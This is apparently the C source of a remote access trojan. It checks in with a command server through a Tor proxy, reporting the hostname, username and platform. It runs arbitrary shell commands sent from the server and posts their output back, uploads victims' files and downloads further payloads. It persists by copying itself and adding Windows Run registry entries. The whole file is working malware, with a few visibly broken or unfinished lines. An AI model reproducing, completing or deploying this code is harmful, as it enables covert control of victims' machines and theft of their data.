#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <curl/curl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFFER_SIZE 256

struct MemoryStruct {
    char *memory;
    size_t size;
};
enum PostType {json = 0,
               file = 1,
               string = 2};

char *UID;
char *PLATFORM;
char *HOSTNAME;
char *USERNAME;
const char *URL;
const char *URL_TOR;
int FAILED_COUNT;
bool IDLE;
int IDLE_TIME;
int INTERVAL;
long TIME_LAST_ACTIVE;

/* ----------------------------------------------------------------------- *
*  Utility
* ------------------------------------------------------------------------ */
void copy(char *source, char *dest)
{
    FILE* fsource = fopen(source, "rb");
    FILE* fdest = fopen(dest, "wb");
    size_t n, m;
    unsigned char buff[8192];
    do {
        n = fread(buff, 1, sizeof buff, fsource);
        if(n) m = fwrite(buff, 1, n, fdest);
        else m = 0;
    } while((n > 0) && (n == m));
    if(m) perror("copy");
    fclose(fsource);
    fclose(fdest);
}

char* fileToString(char* file_name)
{
    FILE *file = fopen(file_name, "r");
    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *buffer = malloc(sizeof(char) * (length + 1));
    buffer[length] = '\0';
    fread(buffer, sizeof(char), length, file);
    fclose(file);
    return buffer;
}

char* get_command(char* todo)
{
    char *todo_temp = malloc(BUFFER_SIZE);
    strcpy(todo_temp,todo);
    char *token = strtok(todo_temp, " ");
    while (token != NULL)
    {
        return token;
    }
    return todo_temp;
}

char* get_args(char* todo)
{
    char *todo_temp = malloc(strlen(todo)+1);
    strcpy(todo_temp,todo);
    const char ch = ' ';
    char *ret;
    ret = strchr(todo_temp, ch);
    ret++;
    return ret;
}

int get_args_len(char* todo)
{
    char *todo_temp = malloc(BUFFER_SIZE);
    strcpy(todo_temp,todo);
    char *token = strtok(todo_temp, " ");
		int count = 0;
    while (token != NULL)
    {
        count++;
        token = strtok(NULL, " ");
    }
    return count - 1;
}

void succeeded_request()
{
    FAILED_COUNT = 0;
}

void failed_request(const char *error)
{
    FAILED_COUNT++;
    fprintf(stdout,"%s\nConsecutive failed connections: %d\n\n"
            ,error,FAILED_COUNT);
}

char* get_unique_id()
{
    char *uid = malloc(BUFFER_SIZE);
    sprintf(uid,"%s_%d",USERNAME,getuid());
    return uid;
}

long get_time()
{
    time_t current_time;
    time(&current_time);
    return current_time;
}


/* ----------------------------------------------------------------------- *
*  Request Wrapper
* ------------------------------------------------------------------------ */
static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)userp;
  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
  if(ptr == NULL) {
    printf("not enough memory (realloc returned NULL)\n");
    return 0;
  }
  mem->memory = ptr;
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;
  return realsize;
}

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
  return written;
}

char* get_request(char *path)
{
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
        else succeeded_request();
        curl_easy_cleanup(curl);
    }
    if(chunk.size == 0) return "";
    return chunk.memory;
}

char* post_request(char *path, char *post_data, enum PostType type)
{
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        struct curl_slist *headers = NULL;
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        if(type == json)
        {
            headers = curl_slist_append(headers, "Accept: application/json");
            headers = curl_slist_append(headers, "Content-Type: application/json");
            headers = curl_slist_append(headers, "charset: utf-8");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        }
        else if(type == string)
        {
            char *escaped_post_data = curl_easy_escape(curl, post_data, strlen(post_data));
            char *final_post_data = malloc(strlen(escaped_post_data) + BUFFER_SIZE);
            sprintf(final_post_data,"output=%s",escaped_post_data);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_post_data);
            curl_free(escaped_post_data);
        }
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
        else succeeded_request();
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    if(chunk.size == 0) return "";
    return chunk.memory;
}

char* upload_request(char *path, char *filename)
{
    CURL *curl;
    CURLM *multi_handle;
    int still_running = 0;
    struct curl_httppost *formpost = NULL;
    struct curl_httppost *lastptr = NULL;
    struct curl_slist *headerlist = NULL;
    curl_formadd(&formpost,
                 &lastptr,
                 CURLFORM_COPYNAME, "sendfile",
                 CURLFORM_FILE, filename,
                 CURLFORM_END);
    curl_formadd(&formpost,
                 &lastptr,
                 CURLFORM_COPYNAME, "filename",
                 CURLFORM_COPYCONTENTS, filename,
                 CURLFORM_END);
    curl_formadd(&formpost,
                 &lastptr,
                 CURLFORM_COPYNAME, "submit",
                 CURLFORM_COPYCONTENTS, "send",
                 CURLFORM_END);
    curl = curl_easy_init();
    multi_handle = curl_multi_init();
    struct curl_slist *headers = NULL;
    if(curl && multi_handle)
    {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        headers = curl_slist_append(headers, "Content-Type: multipart/form-data;");
        headers = curl_slist_append(headers, "Expect: ");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        curl_multi_add_handle(multi_handle, curl);
        curl_multi_perform(multi_handle, &still_running);
        while(still_running)
        {
            struct timeval timeout;
            int rc;
            CURLMcode mc;
            fd_set fdread;
            fd_set fdwrite;
            fd_set fdexcep;
            int maxfd = -1;
            long curl_timeo = -1;
            FD_ZERO(&fdread);
            FD_ZERO(&fdwrite);
            FD_ZERO(&fdexcep);
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;
            curl_multi_timeout(multi_handle, &curl_timeo);
            if(curl_timeo >= 0)
            {
                timeout.tv_sec = curl_timeo / 1000;
                if(timeout.tv_sec > 1)
                    timeout.tv_sec = 1;
                else
                    timeout.tv_usec = (curl_timeo % 1000) * 1000;
            }
            mc = curl_multi_fdset(multi_handle, &fdread, &fdwrite, &fdexcep, &maxfd);
            if(mc != CURLM_OK)
            {
                fprintf(stderr, "curl_multi_fdset() failed, code %d.\n", mc);
                break;
            }
            if(maxfd == -1)
            {
#ifdef _WIN32
                Sleep(100);
                rc = 0;
#else
                struct timeval wait = { 0, 100 * 1000 };
                rc = select(0, NULL, NULL, NULL, &wait);
#endif
            }
            else
            {
                rc = select(maxfd + 1, &fdread, &fdwrite, &fdexcep, &timeout);
            }
            switch(rc)
            {
                case -1:
                    break;
                case 0:
                default:
                    curl_multi_perform(multi_handle, &still_running);
                    break;
            }
        }
        curl_multi_cleanup(multi_handle);
        curl_easy_cleanup(curl);
        curl_formfree(formpost);
        curl_slist_free_all(headerlist);
    }
    return 0;
}
bool download_request(char* url, char* destination)
{
    CURL *curl;
    CURLcode res;
    char *pagefilename = destination;
    FILE *pagefile;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    pagefile = fopen(pagefilename, "wb");
    if(pagefile)
    {
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, pagefile);
        res = curl_easy_perform(curl);
        fclose(pagefile);
        if(res != CURLE_OK)
        {
            failed_request(curl_easy_strerror(res));
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return false;
        }
		}
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return true;
}


/* ----------------------------------------------------------------------- *
*  Action Threads
* ------------------------------------------------------------------------ */
void send_output(char* output, bool newlines)
{
    char *output_temp = malloc(strlen(output)+BUFFER_SIZE);
    if(output!= NULL && output[0] == '\0') return;
    if(newlines)
    {
        strcpy(output_temp,output);
        strcat(output_temp,"\n\n");
    }
    else strcpy(output_temp,output);
    char *path = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/report", get_unique_id());
    post_request(path, output_temp, string);

}
char* say_hello()
{
    char *path = malloc(BUFFER_SIZE);
    char *post_data = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/hello", get_unique_id());
    sprintf(post_data,
            "{\"platform\": \"%s\",\
             \"hostname\": \"%s\",\
             \"username\": \"%s\"}",
            PLATFORM,HOSTNAME,USERNAME);
    return post_request(path, post_data, json);
}

void persist()
{
//#if _WIN32
    char *persist_dir = malloc(BUFFER_SIZE);
    char *persist_dir_win = malloc(BUFFER_SIZE);
    //char *user_dir = getenv("USERPROFILE");
    char *user_dir = "~";
    sprintf(persist_dir_win,"%s%s",user_dir,"\\apic");
    sprintf(persist_dir,"%s%s",user_dir,"/apic");
    struct stat st = {0};
    if(stat(persist_dir, &st) == -1 || stat(persist_dir_win, &st) == -1)
    {
        mkdir(persist_dir, 0755);
    }
    else
    {
        //pthread_exit(NULL);
        return;
    }
    char *command = malloc(BUFFER_SIZE);
    sprintf(command, "cp");
    if(system(command) != -1)
    {
        sprintf(command, "mkdir -p %s/apic && cp ./apic %s/apic", persist_dir, persist_dir);
        system(command);
        sprintf(command, "mkdir -p %s/tor && cp -r ./tor %s/tor", persist_dir, persist_dir);
        system(command);
    }
    sprintf(command, "copy");
    if(system(command) != -1)
    {
        sprintf(command, "if not exist \"%s\\apic\" mkdir %s\\apic && copy .\\apic %s\\apic",
                persist_dir_win, persist_dir_win, persist_dir_win);
        system(command);
        sprintf(command, "if not exist \"%s\\tor\" mkdir %s\\apic && copyx .\\tor %s\\tor",
                persist_dir_win, persist_dir_win, persist_dir_win);
        system(command);
    }
    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic /t REG_SZ /d \"%s\\apic\\apic.exe\"", persist_dir_win);
    system(command);
    sprintf(command, "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor /t REG_SZ /d \"%s\\tor\\tor\\tor.exe\"", persist_dir_win);
    system(command);
    printf("Installed!");
    printf("\n");
    send_output("[+] Installed",true);
//#elif __LINUX__
    //TODO
//#endif
    //pthread_exit(NULL);
    return;
}

void clean()
{
#if _WIN32
    sprintf(command, "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v apic");
    system(command);
    sprintf(command, "reg deleteHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v tor");
    system(command);
    printf("Removed!");
    printf("\n");
    send_output("[+] Removed",true);
#elif __LINUX__
    //TODO
#endif
    return;
}

void* download(void* input)
{
    char *arg1, *arg2;
    char *token = strtok(input, " ");
    arg1 = token;
    token = strtok(NULL, " ");
    arg2 = token;
    send_output("[*] Downloading ...",true);
    bool success = download_request(arg1, arg2);
    if(success)
        send_output("[+] File downloaded",true);
    else
        send_output("[!] File download failed",true);
    pthread_exit(NULL);
}

void* upload(void* input)
{
    FILE *f = fopen(input, "r");
    if(f == NULL)
    {
        send_output("[!] No such file",true);
        pthread_exit(NULL);
    }
    else
    {
        send_output("[*] Uploading ...",true);
        char *path = malloc(BUFFER_SIZE);
        sprintf(path, "/api/%s/upload", get_unique_id());
        upload_request(path, input);
    }
    pthread_exit(NULL);
    return NULL;
}

void* do_command(void* input)
{
    char* instruction = " 2>&1";
    char* command = malloc(strlen(input) + strlen(instruction) + BUFFER_SIZE);
    sprintf(command, "%s %s",(char*)input, instruction);
    char buffer[BUFFER_SIZE*2];
    size_t buffer_size = BUFFER_SIZE*2;
    char *output = malloc(BUFFER_SIZE*2);
    FILE *f = popen(command, "r");
    if(f == NULL)
    {
        send_output("[!] Unable to popen command", true);
        pthread_exit(NULL);
    }
    while(fgets(buffer, sizeof(buffer), f) != NULL) {
        if(strlen(output) >= buffer_size-300)
        {
            buffer_size = buffer_size + BUFFER_SIZE*2;
            output = realloc(output, buffer_size);
        }
        strcat(output, buffer);
    }
    output = realloc(output, strlen(output) + BUFFER_SIZE);
    strcat(output,"\n\n");
    pclose(f);
    send_output(output, true);
    pthread_exit(NULL);
    return NULL;
}

/* ----------------------------------------------------------------------- *
*  Main Function
* ------------------------------------------------------------------------ */
void setup()
{
    UID = malloc(BUFFER_SIZE);
    PLATFORM = malloc(BUFFER_SIZE);
    HOSTNAME = malloc(BUFFER_SIZE);
    USERNAME = malloc(BUFFER_SIZE);
    FAILED_COUNT = 0;
    IDLE = true;
    IDLE_TIME = 60;
    INTERVAL = 3;
    TIME_LAST_ACTIVE = get_time();
    if(getenv("URL") == NULL || getenv("URL_TOR") == NULL)
    {
        fprintf(stderr, "[!] No Path Variable Set");
        exit(0);
    }
    URL = getenv("URL");
    URL_TOR = getenv("URL_TOR");
#if __APPLE__
        PLATFORM = "MAC OS";
        gethostname(HOSTNAME, BUFFER_SIZE);
        getlogin_r(USERNAME, BUFFER_SIZE);
#elif _WIN32
        PLATFORM = "WINDOWS";
        DWORD bufCharCount = BUFFER_SIZE;
        GetComputerName(HOSTNAME, &bufCharCount);
        GetUserName(USERNAME, &bufCharCount);
        INTERVAL = 3 * 100;
#elif __LINUX__
        PLATFORM = "LINUX";
        gethostname(HOSTNAME, BUFFER_SIZE);
        getlogin_r(USERNAME, BUFFER_SIZE);
#else
        PLATFORM = "NONE";
#endif
}

void run()
{
    char *todo = malloc(BUFFER_SIZE*2);
    char *output = malloc(BUFFER_SIZE);
    while(1){
        todo = say_hello();
        if(!(todo!= NULL && todo[0] == '\0'))
        {
            printf("%s\n",todo);
            IDLE = false;
            TIME_LAST_ACTIVE = get_time();
            sprintf(output,"$ %s",todo);
            send_output(output, true);
            char *command = get_command(todo);
            int args_len = get_args_len(todo);
            pthread_t tid;
            if(strcmp("cd",command) == 0)
            {
                if(args_len == 0)
                    send_output("Usage: cd </path/to/directory>",true);
                else
                    chdir(get_args(todo));
            }
            else if(strcmp("upload",command) == 0)
            {
                if(args_len == 0)
                    send_output("Usage: upload <localfile>",true);
                else
                    pthread_create(&tid, NULL, upload, get_args(todo));
            }
            else if(strcmp("download",command) == 0)
            {
                if(args_len != 2)
                    send_output("Usage: download <remote_url> <destination>",true);
                else
                    pthread_create(&tid, NULL, download, get_args(todo));
            }
            else if(strcmp("persist",command) == 0)
            {
                //pthread_create(&tid, NULL, persist, NULL);
            }
/*
            else if(strcmp("clean",command) == 0)
            {

            }
            else if(strcmp("exit",command) == 0)
            {

            }
*/
            else
            {
                pthread_create(&tid, NULL, do_command, todo);
            }
        }
        else
        {
            if(IDLE) sleep(INTERVAL);
            else if (get_time() - TIME_LAST_ACTIVE > IDLE_TIME) IDLE = true;
            else sleep(1);
        }
    }
}

int main()
{
    setup();
    persist();

    //run();
    return 0;
}
